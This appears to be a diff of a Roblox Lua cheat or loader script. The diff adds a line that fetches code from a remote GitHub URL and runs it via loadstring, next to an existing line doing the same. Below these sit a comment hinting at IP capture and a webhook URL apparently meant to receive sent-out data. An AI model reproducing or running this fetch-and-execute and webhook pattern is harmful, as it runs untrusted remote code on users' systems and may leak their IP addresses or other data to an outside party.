@@ -1,5 +1,5 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/II-Fallzy-II/ExFallzY/main/beta"))()
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/II-Fallzy-II/ExFallzY/main/fruit"))()
 --ip than tack
 
 local webh = "https://websec.services/send/62d7641842cd3fcfb203398b"
